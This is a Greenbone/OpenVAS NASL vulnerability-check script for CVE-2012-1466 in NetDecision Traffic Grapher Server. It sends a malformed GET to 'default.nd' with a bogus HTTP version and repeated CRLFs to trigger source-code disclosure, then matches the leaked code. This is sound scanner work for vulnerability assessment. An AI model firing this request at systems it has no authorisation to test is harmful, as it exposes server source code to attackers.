if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802704" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-1466" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-03-09 13:50:32 +0530 (Fri, 09 Mar 2012)" );
	script_name( "Netmechanica NetDecision Traffic Grapher Server Information Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://secpod.org/blog/?p=481" );
	script_xref( name: "URL", value: "http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py" );
	script_xref( name: "URL", value: "http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_Vuln.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8087 );
	script_mandatory_keys( "NetDecision-HTTP-Server/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to gain sensitive information." );
	script_tag( name: "affected", value: "NetDecision Traffic Grapher Server version 4.5.1" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of malicious HTTP GET
  request to 'default.nd' with invalid HTTP version number followed by multiple
  'CRLF', which discloses the source code of 'default.nd'." );
	script_tag( name: "solution", value: "Upgrade to Traffic Grapher Server 4.6.1 or later." );
	script_tag( name: "summary", value: "This host is running NetDecision Traffic Grapher Server and is
  prone to information disclosure vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.netmechanica.com/downloads/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8087 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: NetDecision-HTTP-Server" )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = NASLString( "GET /default.nd HTTP/-1111111\\r\\n\\r\\n" );
send( socket: soc, data: req );
for(i = 0;i < 9;i++){
	send( socket: soc, data: raw_string( 0x0d, 0x0a ) );
	sleep( 1 );
}
sleep( 3 );
res = http_recv_body( socket: soc );
if(!res){
	http_close_socket( soc );
	exit( 0 );
}
if(( ContainsString( res, "NetDecision Traffic Grapher Web Interface" ) ) && ( ContainsString( res, "GetNetDecisionSystemDir(ND_LOG_DIR)" ) ) && ( ContainsString( res, "func PopulateProperty" ) ) && ( ContainsString( res, "func PopulateInfo()" ) )){
	security_message( port: port );
	http_close_socket( soc );
	exit( 0 );
}
exit( 99 );

